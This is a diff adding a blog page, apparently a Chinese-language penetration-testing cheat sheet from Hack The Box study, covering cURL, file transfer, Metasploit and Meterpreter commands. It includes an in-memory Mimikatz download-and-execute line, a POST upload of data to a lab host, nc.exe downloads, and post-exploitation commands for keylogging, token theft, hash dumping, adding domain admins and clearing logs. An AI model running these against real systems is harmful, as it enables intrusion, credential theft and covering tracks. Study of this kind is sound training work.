@@ -1,0 +1,836 @@
+
+<!DOCTYPE html>
+<html lang="en ">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Salve || 备忘录</title>
+    <meta name="author" content="TiAmo">
+    <meta name="description" content="Buona notte ">
+    <meta name="keywords" content=" ">
+    <link rel="icon" href="/avatar.png">
+    <link rel="stylesheet" href="/css/antd.min.css">
+    
+    <link rel="stylesheet" href="/css/full-theme.css">
+    
+    <script src="/js/vue.js"></script>
+    <script src="/js/antd.min.js"></script>
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+
+    <div id="loading"
+        style="height: 100vh; width: 100%; position: fixed;display: flex;z-index: 200; justify-content: space-between;">
+        <div id="loadleft" style="width: 50%;background-color: #ffffff;transition: width 0.6s ease-out;"></div>
+        <div id="loadright" style="width: 50%;background-color: #ffffff;transition: width 0.6s ease-out;"></div>
+        <div
+            style="position: fixed; height: 100vh; width: 100%;display: flex;justify-content: center;align-items: center;">
+            <div id="loadcontent"
+                style="width:400px;height:400px;padding:50px;border-radius:50%;display:flex;justify-content:center;align-items:center;border:solid 10px#a3ddfb; text-align:center;opacity:1;transition:opacity 0.3s ease-out;">
+                <div>
+                    <h2>LOADING...</h2>
+                    <p>加载过慢请开启缓存(浏览器默认开启)</p>
+                    <div>
+                        <img src="/dancingkitty.gif" alt="loading">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="layout">
+        <transition name="into">
+            <div v-show="show_page" style="display: none;">
+                <div id="menu_show">
+                     
+<nav id="menu">
+    <div class="desktop-menu">
+        <a href="/">
+            <span class="title">Salve</span>
+        </a>
+        
+        <a href="/">
+            <span>
+                <a-icon type="home" theme="filled" />
+            </span>
+            <span>home</span>
+        </a>
+        
+        <a href="/about">
+            <span>
+                <a-icon type="idcard" theme="filled" />
+            </span>
+            <span>about</span>
+        </a>
+        
+        <a href="/archives">
+            <span>
+                <a-icon type="folder" theme="filled" />
+            </span>
+            <span>archives</span>
+        </a>
+        
+        <a href="/like/categories">
+            <span>
+                <a-icon type="book" theme="filled" />
+            </span>
+            <span>categories</span>
+        </a>
+        
+        <a href="/like/tags">
+            <span>
+                <a-icon type="tags" theme="filled" />
+            </span>
+            <span>tags</span>
+        </a>
+        
+        <a target="_blank" rel="noopener" href="https://en.korilin.com">
+            <span>
+                <a-icon type="compass" theme="filled" />
+            </span>
+            <span>英文博客</span>
+        </a>
+        
+    </div>
+
+    <div :class="'phone-menu ' + menu_show" id="phone-menu">
+        <div :class="'title'" @click="menu_show=!menu_show">
+            <span style="margin-right: 10px;">
+                <a-icon type="appstore" theme="filled" />
+            </span>
+            <span>Salve</span>
+        </div>
+        <div class="items" v-show="menu_show">
+            
+            <a href="/">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="home" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">home</div>
+                </div>
+            </a>
+            
+            <a href="/about">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="idcard" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">about</div>
+                </div>
+            </a>
+            
+            <a href="/archives">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="folder" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">archives</div>
+                </div>
+            </a>
+            
+            <a href="/like/categories">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="book" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">categories</div>
+                </div>
+            </a>
+            
+            <a href="/like/tags">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="tags" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">tags</div>
+                </div>
+            </a>
+            
+            <a target="_blank" rel="noopener" href="https://en.korilin.com">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="compass" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">英文博客</div>
+                </div>
+            </a>
+            
+        </div>
+        <div class="curtain" v-show="menu_show"></div>
+    </div>
+
+</nav>
+                </div>
+
+                <div id="main">
+                     
+<link rel="stylesheet" href="/css/post-body.css">
+<div class="article">
+    <div>
+        <h1>备忘录 </h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <a-icon type="calendar" theme="filled" />
+            </span>
+            2023/6/11
+        </span>
+
+        
+
+        
+
+        <span class="tags">
+            <span class="icon">
+                <a-icon type="tags" theme="filled" />
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/备忘录" style=color:#ffa2c4>
+                    备忘录
+                </a>
+            </span>
+            
+        </span>
+        
+    </div>
+
+    <div class="content" v-pre>
+        <h1 id="备忘录"><a href="#备忘录" class="headerlink" title="备忘录"></a>备忘录</h1><h2 id="cURL"><a href="#cURL" class="headerlink" title="cURL"></a>cURL</h2><table>
+<thead>
+<tr>
+<th><strong>Command</strong></th>
+<th><strong>Description</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>curl -h</code></td>
+<td>cURL help menu</td>
+</tr>
+<tr>
+<td><code>curl inlanefreight.com</code></td>
+<td>Basic GET request</td>
+</tr>
+<tr>
+<td><code>curl -s -O inlanefreight.com/index.html</code></td>
+<td>Download file</td>
+</tr>
+<tr>
+<td><code>curl -k https://inlanefreight.com</code></td>
+<td>Skip HTTPS (SSL) certificate validation</td>
+</tr>
+<tr>
+<td><code>curl inlanefreight.com -v</code></td>
+<td>Print full HTTP request&#x2F;response details</td>
+</tr>
+<tr>
+<td><code>curl -I https://www.inlanefreight.com</code></td>
+<td>Send HEAD request (only prints response headers)</td>
+</tr>
+<tr>
+<td><code>curl -i https://www.inlanefreight.com</code></td>
+<td>Print response headers and response body</td>
+</tr>
+<tr>
+<td><code>curl https://www.inlanefreight.com -A &#39;Mozilla/5.0&#39;</code></td>
+<td>Set User-Agent header</td>
+</tr>
+<tr>
+<td><code>curl -u admin:admin http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/</code></td>
+<td>Set HTTP basic authorization credentials</td>
+</tr>
+<tr>
+<td><code>curl http://admin:admin@&lt;SERVER_IP&gt;:&lt;PORT&gt;/</code></td>
+<td>Pass HTTP basic authorization credentials in the URL</td>
+</tr>
+<tr>
+<td><code>curl -H &#39;Authorization: Basic YWRtaW46YWRtaW4=&#39; http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/</code></td>
+<td>Set request header</td>
+</tr>
+<tr>
+<td><code>curl &#39;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/search.php?search=le&#39;</code></td>
+<td>Pass GET parameters</td>
+</tr>
+<tr>
+<td><code>curl -X POST -d &#39;username=admin&amp;password=admin&#39; http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/</code></td>
+<td>Send POST request with POST data</td>
+</tr>
+<tr>
+<td><code>curl -b &#39;PHPSESSID=c1nsa6op7vtk7kdis7bcnbadf1&#39; http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/</code></td>
+<td>Set request cookies</td>
+</tr>
+<tr>
+<td><code>curl -X POST -d &#39;&#123;&quot;search&quot;:&quot;london&quot;&#125;&#39; -H &#39;Content-Type: application/json&#39; http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/search.php</code></td>
+<td>Send POST request with JSON data</td>
+</tr>
+</tbody></table>
+<h2 id="APIs"><a href="#APIs" class="headerlink" title="APIs"></a>APIs</h2><table>
+<thead>
+<tr>
+<th><strong>Command</strong></th>
+<th><strong>Description</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>curl http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/api.php/city/london</code></td>
+<td>Read entry</td>
+</tr>
+<tr>
+<td>&#96;curl -s http:&#x2F;&#x2F;<SERVER_IP>:<PORT>&#x2F;api.php&#x2F;city&#x2F;</td>
+<td>jq&#96;</td>
+</tr>
+<tr>
+<td><code>curl -X POST http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/api.php/city/ -d &#39;&#123;&quot;city_name&quot;:&quot;HTB_City&quot;, &quot;country_name&quot;:&quot;HTB&quot;&#125;&#39; -H &#39;Content-Type: application/json&#39;</code></td>
+<td>Create (add) entry</td>
+</tr>
+<tr>
+<td><code>curl -X PUT http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/api.php/city/london -d &#39;&#123;&quot;city_name&quot;:&quot;New_HTB_City&quot;, &quot;country_name&quot;:&quot;HTB&quot;&#125;&#39; -H &#39;Content-Type: application/json&#39;</code></td>
+<td>Update (modify) entry</td>
+</tr>
+<tr>
+<td><code>curl -X DELETE http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/api.php/city/New_HTB_City</code></td>
+<td>Delete entry</td>
+</tr>
+</tbody></table>
+<h2 id="Browser-DevTools"><a href="#Browser-DevTools" class="headerlink" title="Browser DevTools"></a>Browser DevTools</h2><table>
+<thead>
+<tr>
+<th><strong>Shortcut</strong></th>
+<th><strong>Description</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>[<code>CTRL+SHIFT+I</code>] or [<code>F12</code>]</td>
+<td>Show devtools</td>
+</tr>
+<tr>
+<td>[<code>CTRL+SHIFT+E</code>]</td>
+<td>Show Network tab</td>
+</tr>
+<tr>
+<td>[<code>CTRL+SHIFT+K</code>]</td>
+<td></td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th><code>curl http:/SERVER_IP:PORT/</code></th>
+<th>cURL 获取请求</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>curl -s http:/SERVER_IP:PORT/ -X POST</code></td>
+<td>cURL 发布请求</td>
+</tr>
+<tr>
+<td><code>curl -s http:/SERVER_IP:PORT/ -X POST -d &quot;param1=sample&quot;</code></td>
+<td>包含数据的网址 POST 请求</td>
+</tr>
+<tr>
+<td>&#96;echo hackthebox</td>
+<td>base64&#96;</td>
+</tr>
+<tr>
+<td>&#96;echo ENCODED_B64</td>
+<td>base64 -d&#96;</td>
+</tr>
+<tr>
+<td>&#96;echo hackthebox</td>
+<td>xxd -p&#96;</td>
+</tr>
+<tr>
+<td>&#96;echo ENCODED_HEX</td>
+<td>xxd -p -r&#96;</td>
+</tr>
+<tr>
+<td>&#96;echo hackthebox</td>
+<td>tr ‘A-Za-z’ ‘N-ZA-Mn-za-m’&#96;</td>
+</tr>
+<tr>
+<td>&#96;echo ENCODED_ROT13</td>
+<td>tr ‘A-Za-z’ ‘N-ZA-Mn-za-m’&#96;</td>
+</tr>
+</tbody></table>
+<h1 id="Deobfuscation-Websites"><a href="#Deobfuscation-Websites" class="headerlink" title="Deobfuscation Websites"></a>Deobfuscation Websites</h1><table>
+<thead>
+<tr>
+<th><strong>Website</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><a target="_blank" rel="noopener" href="https://jsconsole.com/">JS Console</a></td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="https://prettier.io/playground/">Prettier</a></td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="https://beautifier.io/">Beautifier</a></td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="http://www.jsnice.org/">JSNice</a></td>
+</tr>
+</tbody></table>
+<p>##文件传输</p>
+<table>
+<thead>
+<tr>
+<th><code>Invoke-WebRequest https://&lt;snip&gt;/PowerView.ps1 -OutFile PowerView.ps1</code></th>
+<th>使用 PowerShell 下载文件</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>IEX (New-Object Net.WebClient).DownloadString(&#39;https://&lt;snip&gt;/Invoke-Mimikatz.ps1&#39;)</code></td>
+<td>使用 PowerShell 在内存中执行文件</td>
+</tr>
+<tr>
+<td><code>Invoke-WebRequest -Uri http://10.10.10.32:443 -Method POST -Body $b64</code></td>
+<td>使用 PowerShell 上传文件</td>
+</tr>
+<tr>
+<td><code>bitsadmin /transfer n http://10.10.10.32/nc.exe C:\Temp\nc.exe</code></td>
+<td>使用 Bitsadmin 下载文件</td>
+</tr>
+<tr>
+<td><code>certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe</code></td>
+<td>使用 Certutil 下载文件</td>
+</tr>
+<tr>
+<td><code>wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh</code></td>
+<td>使用 Wget 下载文件</td>
+</tr>
+<tr>
+<td><code>curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh</code></td>
+<td>使用 cURL 下载文件</td>
+</tr>
+<tr>
+<td><code>php -r &#39;$file = file_get_contents(&quot;https://&lt;snip&gt;/LinEnum.sh&quot;); file_put_contents(&quot;LinEnum.sh&quot;,$file);&#39;</code></td>
+<td>使用 PHP 下载文件</td>
+</tr>
+<tr>
+<td><code>scp C:\Temp\bloodhound.zip user@10.10.10.150:/tmp/bloodhound.zip</code></td>
+<td>使用 SCP 上传文件</td>
+</tr>
+<tr>
+<td><code>scp user@target:/tmp/mimikatz.exe C:\Temp\mimikatz.exe</code></td>
+<td>使用 SCP 下载文件</td>
+</tr>
+<tr>
+<td><code>Invoke-WebRequest http://nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile &quot;nc.exe&quot;</code></td>
+<td>使用 Chrome 用户代理的 Invoke-WebRequest</td>
+</tr>
+</tbody></table>
+<h3 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h3><table>
+<thead>
+<tr>
+<th><code>show exploits</code></th>
+<th>显示框架内的所有漏洞。</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>show payloads</code></td>
+<td>显示框架中的所有有效负载。</td>
+</tr>
+<tr>
+<td><code>show auxiliary</code></td>
+<td>显示框架中的所有辅助模块。</td>
+</tr>
+<tr>
+<td><code>search &lt;name&gt;</code></td>
+<td>在框架中搜索漏洞或模块。</td>
+</tr>
+<tr>
+<td><code>info</code></td>
+<td>加载有关特定漏洞利用或模块的信息。</td>
+</tr>
+<tr>
+<td><code>use &lt;name&gt;</code></td>
+<td>加载漏洞利用或模块（例如：使用 Windows&#x2F;smb&#x2F;psexec）。</td>
+</tr>
+<tr>
+<td><code>use &lt;number&gt;</code></td>
+<td>使用搜索命令后显示的索引号加载漏洞利用。</td>
+</tr>
+<tr>
+<td><code>LHOST</code></td>
+<td>目标可访问的本地主机 IP 地址，如果不在本地网络上，通常是公共 IP 地址。通常用于反向壳。</td>
+</tr>
+<tr>
+<td><code>RHOST</code></td>
+<td>远程主机或目标。set函数 设置特定值（例如，LHOST 或 RHOST）。</td>
+</tr>
+<tr>
+<td><code>setg &lt;function&gt;</code></td>
+<td>全局设置特定值（例如，LHOST 或 RHOST）。</td>
+</tr>
+<tr>
+<td><code>show options</code></td>
+<td>显示可用于模块或漏洞利用的选项。</td>
+</tr>
+<tr>
+<td><code>show targets</code></td>
+<td>显示漏洞利用支持的平台。</td>
+</tr>
+<tr>
+<td><code>set target &lt;number&gt;</code></td>
+<td>如果您知道操作系统和服务包，请指定特定的目标索引。</td>
+</tr>
+<tr>
+<td><code>set payload &lt;payload&gt;</code></td>
+<td>指定要使用的有效负载。</td>
+</tr>
+<tr>
+<td><code>set payload &lt;number&gt;</code></td>
+<td>指定要在显示有效负载命令后使用的有效负载索引号。</td>
+</tr>
+<tr>
+<td><code>show advanced</code></td>
+<td>显示高级选项。</td>
+</tr>
+<tr>
+<td><code>set autorunscript migrate -f</code></td>
+<td>漏洞利用完成后自动迁移到单独的进程。</td>
+</tr>
+<tr>
+<td><code>check</code></td>
+<td>确定目标是否容易受到攻击。</td>
+</tr>
+<tr>
+<td><code>exploit</code></td>
+<td>执行模块或利用并攻击目标。</td>
+</tr>
+<tr>
+<td><code>exploit -j</code></td>
+<td>在作业上下文中运行漏洞利用。（这将在后台运行漏洞利用。</td>
+</tr>
+<tr>
+<td><code>exploit -z</code></td>
+<td>成功利用漏洞后不要与会话交互。</td>
+</tr>
+<tr>
+<td><code>exploit -e &lt;encoder&gt;</code></td>
+<td>指定要使用的有效负载编码器（例如：exploit –e shikata_ga_nai）。</td>
+</tr>
+<tr>
+<td><code>exploit -h</code></td>
+<td>显示漏洞利用命令的帮助。</td>
+</tr>
+<tr>
+<td><code>sessions -l</code></td>
+<td>列出可用会话（在处理多个 shell 时使用）。</td>
+</tr>
+<tr>
+<td><code>sessions -l -v</code></td>
+<td>列出所有可用会话并显示详细字段，例如利用系统时使用了哪个漏洞。</td>
+</tr>
+<tr>
+<td><code>sessions -s &lt;script&gt;</code></td>
+<td>在所有 Meterpreter 实时会话上运行特定的 Meterpreter 脚本。</td>
+</tr>
+<tr>
+<td><code>sessions -K</code></td>
+<td>终止所有实时会话。</td>
+</tr>
+<tr>
+<td><code>sessions -c &lt;cmd&gt;</code></td>
+<td>在所有实时 Meterpreter 会话上执行命令。</td>
+</tr>
+<tr>
+<td><code>sessions -u &lt;sessionID&gt;</code></td>
+<td>将普通的 Win32 外壳升级到 Meterpreter 控制台。</td>
+</tr>
+<tr>
+<td><code>db_create &lt;name&gt;</code></td>
+<td>创建用于数据库驱动攻击的数据库（例如：db_create autopwn）。</td>
+</tr>
+<tr>
+<td><code>db_connect &lt;name&gt;</code></td>
+<td>创建并连接到用于驱动攻击的数据库（例如：db_connect autopwn）。</td>
+</tr>
+<tr>
+<td><code>db_nmap</code></td>
+<td>使用 Nmap 并将结果放入数据库中。（支持正常的 Nmap 语法，例如 –sT –v –P0。</td>
+</tr>
+<tr>
+<td><code>db_destroy</code></td>
+<td>删除当前数据库。</td>
+</tr>
+<tr>
+<td><code>db_destroy &lt;user:password@host:port/database&gt;</code></td>
+<td>使用高级选项删除数据库。</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="仪表管理员命令"><a href="#仪表管理员命令" class="headerlink" title="仪表管理员命令"></a>仪表管理员命令</h2><table>
+<thead>
+<tr>
+<th><strong>命令</strong></th>
+<th><strong>描述</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>help</code></td>
+<td>打开 Meterpreter 使用帮助。</td>
+</tr>
+<tr>
+<td><code>run &lt;scriptname&gt;</code></td>
+<td>运行基于 Meterpreter 的脚本;有关完整列表，请查看 scripts&#x2F;meterpreter 目录。</td>
+</tr>
+<tr>
+<td><code>sysinfo</code></td>
+<td>显示有关受损目标的系统信息。</td>
+</tr>
+<tr>
+<td><code>ls</code></td>
+<td>列出目标上的文件和文件夹。</td>
+</tr>
+<tr>
+<td><code>use priv</code></td>
+<td>加载扩展的 Meterpreter 库的权限扩展。</td>
+</tr>
+<tr>
+<td><code>ps</code></td>
+<td>显示所有正在运行的进程以及与每个进程关联的帐户。</td>
+</tr>
+<tr>
+<td><code>migrate &lt;proc. id&gt;</code></td>
+<td>迁移到特定进程 ID（PID 是从 ps 命令获取的目标进程 ID）。</td>
+</tr>
+<tr>
+<td><code>use incognito</code></td>
+<td>加载隐身功能。（用于目标计算机上的令牌窃取和模拟。</td>
+</tr>
+<tr>
+<td><code>list_tokens -u</code></td>
+<td>按用户列出目标上的可用令牌。</td>
+</tr>
+<tr>
+<td><code>list_tokens -g</code></td>
+<td>按组列出目标上的可用令牌。</td>
+</tr>
+<tr>
+<td><code>impersonate_token &lt;DOMAIN_NAMEUSERNAME&gt;</code></td>
+<td>模拟目标上可用的令牌。</td>
+</tr>
+<tr>
+<td><code>steal_token &lt;proc. id&gt;</code></td>
+<td>窃取可用于给定进程的令牌并模拟该令牌。</td>
+</tr>
+<tr>
+<td><code>drop_token</code></td>
+<td>停止模拟当前令牌。</td>
+</tr>
+<tr>
+<td><code>getsystem</code></td>
+<td>尝试通过多个攻击媒介将权限提升为 SYSTEM 级访问权限。</td>
+</tr>
+<tr>
+<td><code>shell</code></td>
+<td>放入包含所有可用令牌的交互式外壳中。</td>
+</tr>
+<tr>
+<td><code>execute -f &lt;cmd.exe&gt; -i</code></td>
+<td>执行cmd.exe并与之交互。</td>
+</tr>
+<tr>
+<td><code>execute -f &lt;cmd.exe&gt; -i -t</code></td>
+<td>使用所有可用的令牌执行 cmd.exe。</td>
+</tr>
+<tr>
+<td><code>execute -f &lt;cmd.exe&gt; -i -H -t</code></td>
+<td>使用所有可用的令牌执行cmd.exe并使其成为隐藏进程。</td>
+</tr>
+<tr>
+<td><code>rev2self</code></td>
+<td>恢复为用于破坏目标的原始用户。</td>
+</tr>
+<tr>
+<td><code>reg &lt;command&gt;</code></td>
+<td>在目标注册表中进行交互、创建、删除、查询、设置等。</td>
+</tr>
+<tr>
+<td><code>setdesktop &lt;number&gt;</code></td>
+<td>根据登录者切换到其他屏幕。</td>
+</tr>
+<tr>
+<td><code>screenshot</code></td>
+<td>截取目标屏幕的屏幕截图。</td>
+</tr>
+<tr>
+<td><code>upload &lt;filename&gt;</code></td>
+<td>将文件上传到目标。</td>
+</tr>
+<tr>
+<td><code>download &lt;filename&gt;</code></td>
+<td>从目标下载文件。</td>
+</tr>
+<tr>
+<td><code>keyscan_start</code></td>
+<td>开始在远程目标上嗅探击键。</td>
+</tr>
+<tr>
+<td><code>keyscan_dump</code></td>
+<td>转储在目标上捕获的远程密钥。</td>
+</tr>
+<tr>
+<td><code>keyscan_stop</code></td>
+<td>停止在远程目标上嗅探击键。</td>
+</tr>
+<tr>
+<td><code>getprivs</code></td>
+<td>在目标上获得尽可能多的权限。</td>
+</tr>
+<tr>
+<td><code>uictl enable &lt;keyboard/mouse&gt;</code></td>
+<td>控制键盘和&#x2F;或鼠标。</td>
+</tr>
+<tr>
+<td><code>background</code></td>
+<td>在后台运行您当前的 Meterpreter shell。</td>
+</tr>
+<tr>
+<td><code>hashdump</code></td>
+<td>在目标上转储所有哈希。使用嗅探器 加载嗅探器模块。</td>
+</tr>
+<tr>
+<td><code>sniffer_interfaces</code></td>
+<td>列出目标上的可用接口。</td>
+</tr>
+<tr>
+<td><code>sniffer_dump &lt;interfaceID&gt; pcapname</code></td>
+<td>开始在远程目标上嗅探。</td>
+</tr>
+<tr>
+<td><code>sniffer_start &lt;interfaceID&gt; packet-buffer</code></td>
+<td>从特定范围的数据包缓冲区开始嗅探。</td>
+</tr>
+<tr>
+<td><code>sniffer_stats &lt;interfaceID&gt;</code></td>
+<td>从您正在嗅探的界面中获取统计信息。</td>
+</tr>
+<tr>
+<td><code>sniffer_stop &lt;interfaceID&gt;</code></td>
+<td>停止嗅探器。</td>
+</tr>
+<tr>
+<td><code>add_user &lt;username&gt; &lt;password&gt; -h &lt;ip&gt;</code></td>
+<td>在远程目标上添加用户。</td>
+</tr>
+<tr>
+<td><code>add_group_user &lt;&quot;Domain Admins&quot;&gt; &lt;username&gt; -h &lt;ip&gt;</code></td>
+<td>将用户名添加到远程目标上的域管理员组。</td>
+</tr>
+<tr>
+<td><code>clearev</code></td>
+<td>清除目标计算机上的事件日志。</td>
+</tr>
+<tr>
+<td><code>timestomp</code></td>
+<td>更改文件属性，例如创建日期（反取证度量）。</td>
+</tr>
+<tr>
+<td><code>reboot</code></td>
+<td>重新启动目标计算机。</td>
+</tr>
+</tbody></table>
+
+    </div>
+
+    
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+    <div id="comment">
+        <div id="gitalk-container">
+        </div>
+    </div>
+    
+</div>
+                     
+<footer id="footer">
+    <div class="footer-wrap">
+        <div>
+            © 2018 - 2023 Salve
+            <span class="footer-icon">
+                <a-icon type="flag" theme="filled" /></span>
+            @TiAmo
+        </div>
+        <div></div>
+        <div>Based on the <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo Engine</a> & <a
+                target="_blank" rel="noopener" href="https://github.com/korilin/hexo-theme-particle">Particle Theme</a></div>
+        
+    </div>
+
+</footer>
+
+<script src="/js/highlight.min.js"></script>
+<script src="/js/particle.js"></script>
+                </div>
+            </div>
+        </transition>
+    </div>
+
+    <script>
+    new Vue({
+        el: "#layout",
+        data: {
+            show_page: false,
+            onload_menu: false,
+            menu_show: false,
+            card_top: 100
+        },
+        created: function () {
+            var that = this
+            window.onload = function () {
+                that.show_page = true
+                document.getElementById("loadcontent").style.opacity = 0
+                setTimeout(function () {
+                    document.getElementById("loadleft").style.width = 0
+                    document.getElementById("loadright").style.width = 0
+                }, 300)
+                setTimeout(function () {
+                    document.getElementById("loading").style = "display:none"
+                }, 600)
+            }
+        },
+        mounted: function () {
+            var that = this
+            window.addEventListener('scroll', function (e) {
+                that.menu_show = false
+            })
+        },
+        methods: {
+            home_click: function () {
+                window.scrollTo({
+                    top: window.innerHeight - 80,
+                    behavior: "smooth",
+                });
+            }
+        }
+    })
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<script>
+    const gitalk = new Gitalk({
+        clientID: '',
+        clientSecret: '',
+        repo: 'hexo-theme-particle',      // The repository of store comments,
+        owner: 'korilin',
+        admin: ['korilin'],
+        language: 'en',
+        id: location.pathname,      // Ensure uniqueness and length less than 50
+        distractionFreeMode: true  // Facebook-like distraction free mode
+    })
+    gitalk.render('gitalk-container')
+</script>
+
+</body>
+
+</html>
